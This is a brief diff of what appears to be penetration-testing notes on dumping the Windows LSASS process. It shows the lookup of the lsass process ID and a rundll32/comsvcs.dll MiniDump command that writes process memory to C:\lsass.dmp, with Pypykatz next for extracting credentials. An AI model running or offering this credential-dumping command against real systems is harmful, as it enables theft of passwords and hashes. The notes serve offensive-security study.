@@ -93,13 +93,13 @@ Before issuing the command to create the dump file, we must determine what proce
 # cmd
 tasklist /svc
 
-# powershell
+# powershell (check Id value)
 Get-Process lsass
 ```
 
 ```powershell
 # dumping lsass with powershell
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump 644 C:\lsass.dmp full
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 636 C:\lsass.dmp full
 ```
 
 #### Pypykatz to extract credentials
